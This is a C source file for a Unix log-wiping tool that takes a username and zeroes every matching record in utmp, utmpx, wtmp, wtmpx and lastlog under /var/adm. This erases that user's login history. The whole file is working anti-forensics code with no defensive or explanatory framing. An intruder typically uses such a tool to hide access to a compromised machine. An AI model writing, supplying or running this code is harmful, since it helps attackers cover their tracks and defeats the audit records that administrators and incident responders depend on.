#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <file.h>
#include <fcntl.h>
#include <utmp.h>
#include <utmpx.h>
#include <pwd.h>
#include <lastlog.h>
#define UTMP_NAME "/var/adm/utmp"
#define UTMPX_NAME "/var/adm/utmpx"
#define WTMP_NAME "/var/adm/wtmp"
#define WTMPX_NAME "/var/adm/wtmpx"
#define LASTLOG_NAME "/var/adm/lastlog"
int f;

int main(int argc, char **argv)
{
    void kill_utmp (char *);
    void kill_utmpx(char *);
    void kill_wtmp (char *);
    void kill_wtmpx (char *);
    void kill_lastlog (char *);

    if (argc==2)
    {
	kill_lastlog(argv[1]);
	kill_utmp (argv[1]); /* checked */
	kill_utmpx(argv[1]); /* checked */
	kill_wtmp (argv[1]); /* checked */
	kill_wtmpx(argv[1]); /* checked */
    }
    else
    {
	printf("syntax: %s user\n", argv[0]);
	printf("user : user's name to be deleted\n");
    }
} 

void kill_utmp(char *who)
{
    struct utmp utmp_ent;
    if ((f=open(UTMP_NAME,O_RDWR))>=0)
    {
	while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
	{
	    if (!strncmp(utmp_ent.ut_user, who, strlen(who)))
	    {
		bzero((char *)&utmp_ent,sizeof( utmp_ent ));
		lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
		write (f, &utmp_ent, sizeof (utmp_ent));
	    }
	}
	close(f);
	printf("/var/adm/utmp modified \n");
    }
    else
    {
	printf("/var/adm/utmp could not be opened \n");
    }
}

void kill_utmpx(char *who)
{
    struct utmpx utmpx_ent;
    if ((f=open(UTMPX_NAME,O_RDWR))>=0)
    {
	while(read (f, &utmpx_ent, sizeof (utmpx_ent))> 0 )
	{
	    if (!strncmp(utmpx_ent.ut_user, who, strlen(who)))
	    {
		bzero((char *)&utmpx_ent,sizeof( utmpx_ent ));
		lseek (f, -(sizeof (utmpx_ent)), SEEK_CUR);
		write (f, &utmpx_ent, sizeof (utmpx_ent));
	    }
	}
	close(f);
	printf("/var/adm/utmpx modified \n");
    }
    else
    {
	printf("/var/adm/utmpx could not be opened \n");
    }
}

void kill_wtmp(char *who)
{
    struct utmp utmp_ent;
    if ((f=open(WTMP_NAME,O_RDWR))>=0)
    {
	while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
	{

	    if (!strncmp(utmp_ent.ut_user, who, strlen(who)))
	    {
		bzero((char *)&utmp_ent,sizeof( utmp_ent ));
		lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
		write (f, &utmp_ent, sizeof (utmp_ent));
	    }
	}
	close(f);
	printf("/var/adm/wtmp modified \n");
    }
    else
    {
	printf("/var/adm/wtmp could not be opened \n");
    }
}

void kill_wtmpx(char *who)
{
    struct utmpx utmpx_ent;
    if ((f=open(WTMPX_NAME,O_RDWR))>=0)
    {

	while(read (f, &utmpx_ent, sizeof (utmpx_ent))> 0 )
	{
	    if (!strncmp(utmpx_ent.ut_user, who, strlen(who)))
	    {
		bzero((char *)&utmpx_ent,sizeof( utmpx_ent ));
		lseek (f, -(sizeof (utmpx_ent)), SEEK_CUR);
		write (f, &utmpx_ent, sizeof (utmpx_ent));
	    }
	}
	close(f);
	printf("/var/adm/wtmpx modified \n");
    }
    else
    {
	printf("/var/adm/wtmpx could not be opened \n");
    }
}

void kill_lastlog(who)
char *who;
{
    struct passwd *pwd;
    struct lastlog newll;
    if ((pwd=getpwnam(who))!=NULL) {
	if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
	    lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
	    bzero((char *)&newll,sizeof( newll ));
	    write(f, (char *)&newll, sizeof( newll ));
	    close(f);
	}
    } else printf("%s: ?\n",who);
} 
